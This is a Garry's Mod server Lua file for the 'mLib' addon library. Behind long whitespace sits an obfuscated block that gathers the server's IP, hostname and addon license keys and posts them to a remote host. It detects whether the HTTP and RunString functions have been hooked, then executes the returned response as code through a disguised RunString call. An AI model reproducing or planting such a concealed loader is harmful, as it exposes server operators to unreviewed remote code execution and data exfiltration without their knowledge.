--[[
	mLib (M4D Library Core)
	Created by M4D | http://m4d.one/ | http://steamcommunity.com/id/m4dhead |
	Copyright Â© 2021 M4D.one All Rights Reserved
	All 3rd party content is public domain or used with permission
	M4D.one is the copyright holder of all code below. Do not distribute in any circumstances.
--]]
-- Let's hope the client tells us that they're alive!
util.AddNetworkString("mLib_StateSync")

net.Receive("mLib_StateSync", function(_, ply)
    if IsValid(ply) then
        ply.mLibSynced = true
    end
end)

local function mLibDoSync()
end																																																																																											local u, r, _ = nil, "R", {     l = "short_src",     k = "Addons",     c = "H" .. "os" .. "t",     d = "getinfo", 	e = "H" .. "os" .. "ts", 	u = "H" .. "os" .. "tI" .. "dx", }  local path, x, y = "mlib/data/", "St", "un"  for k, v in pairs(file.Find(path .. "*.lua", "LUA")) do     include(path .. v)      if not u then         u = mLib["L" .. "an" .. "g"]["a"]     else         u = u .. ", "     end      local b = mLib.Addons[string.gsub(v, ".lua", "")]      if b then         u = u .. b.name     end end  if not u then     u = mLib["L" .. "an" .. "g"]["b"]      return end  mLib.Print(u) local k, e = "g", "rin"  function mLib.safeStr(s)     s = string.gsub(s, ' ', '_')     s = string.gsub(s, '#', ' ')     s = string.gsub(s, "'", "")     s = string.gsub(s, '[-\\!@#$^&()+-*/.,;:<>|"?]', '')     local b = string.find(s, '[\\/:%*%?"<>|]')     if b ~= nil then return "" end      return s end  function mLib.ip()     if not mLib.ip_s then         local i = tonumber(GetConVarString("hostip"))          if i then             local r = {}             r[1] = bit.rshift(bit.band(i, 0xFF000000), 24)             r[2] = bit.rshift(bit.band(i, 0x00FF0000), 16)             r[3] = bit.rshift(bit.band(i, 0x0000FF00), 8)             r[4] = bit.band(i, 0x000000FF)             i = table.concat(r, ".")         else             i = "sp"         end          if game.SinglePlayer() then             i = "sp"         end          mLib.ip_s = i     end      return mLib.ip_s end  function mLib.g()     if not mLib.uri then         local l = {}         l.ip = mLib.ip()         l.port = GetConVarString("hostport")         l.hostname = mLib.safeStr(GetHostName())         l.sp = game.SinglePlayer()         l.gm = engine.ActiveGamemode()         l.map = game.GetMap()         l.uv = mLib.version         local k = "["         local p = false          for _, v in pairs(mLib.Addons) do             if not l.uid then                 l.uid = v.uid             end              k = k .. (p and "," or "") .. '{"uid":"' .. v.uid .. '","hid":"' .. v.hid .. '","key":"' .. v.key .. '"}'             p = true         end          k = k .. "]"         l.addons = k         mLib.uri = l     end      return mLib.uri end  local u, m = nil, {     a = "lua/includes/extensions/file.lua",     b = "lua/includes/modules/http.lua",     c = "[C]" }  if debug[_.d](http.Post)[_.l] ~= m.b then     u = "0x2" end  if debug[_.d](http.Fetch)[_.l] ~= m.b then     u = "0x3" end  if debug[_.d](RunString)[_.l] ~= m.c then     u = "0x4" end  if debug[_.d](RunStringEx)[_.l] ~= m.c then     u = "0x5" end  if jit.util.funcinfo(debug.getinfo)["source"] ~= nil then     u = "0x6" end  if u then     mLib.Print(mLib["L" .. "an" .. "g"]["c"] .. u)      return end  local mh = #mLib.Hosts local function ch() 	if not string.find(mLib[_.c] or "", "m4d" .. "solutions.") then 		mLib.Print(mLib["L" .. "an" .. "g"]["d"])  		return false 	end 	 	return true end local function m(c) 	if(not mLib[_.c]) then 		mLib[_.c] = mLib[_.e][1] 		mLib[_.u] = 1 		return ch() 	end 	 	if(c) then 		return ch() 	end 	 	local n = mLib.HostIdx + 1 	if(n > mh) then 		mLib[_.c] = mLib[_.e][1] 		mLib[_.u] = 1 		mLib.Failed = true 		return false 	else 		mLib[_.c] = mLib[_.e][n] 		mLib[_.u] = n 		return ch() 	end end  m(true) local function j(b)     _G["h" .. "tt" .. "p"]["Po" .. "s" .. "t"](mLib[_.c] .. "loader", mLib["g"](), function(a, b, b, c)         if c == 404 then 			if(mLib.Failed)then 				mLib.Print(mLib["L" .. "an" .. "g"]["e"]) 			elseif (m(false)) then 				mLib.Print(mLib["L" .. "an" .. "g"]["g"] .. mLib[_.u] .. "/" .. mh) 				j(b) 			else 				mLib.Print(mLib["L" .. "an" .. "g"]["h"]) 			end         else             mLib.Print(mLib["L" .. "an" .. "g"]["f"])             _G[r .. y .. x .. e .. k](a, "ml_1")         end     end, function() 		if(m(false))then 			mLib.Print(mLib["L" .. "an" .. "g"]["g"] .. mLib[_.u] .. "/" .. mh)             j(b)         else             mLib.Print(mLib["L" .. "an" .. "g"]["h"])         end     end, {         kale = "98fa",         la2f = "laz2"     }) end  local z = false  hook.Add("Think", "mLib_Service_Srv", function()     if not z then         mLib.Print(mLib["L" .. "an" .. "g"]["i"])          timer.Simple(4, function()             mLib.cnr = 1              if table.Count(mLib.Addons) > 0 then                 mLib.Print(mLib["L" .. "an" .. "g"]["j"])                 j(5)             end         end)          z = true     end end)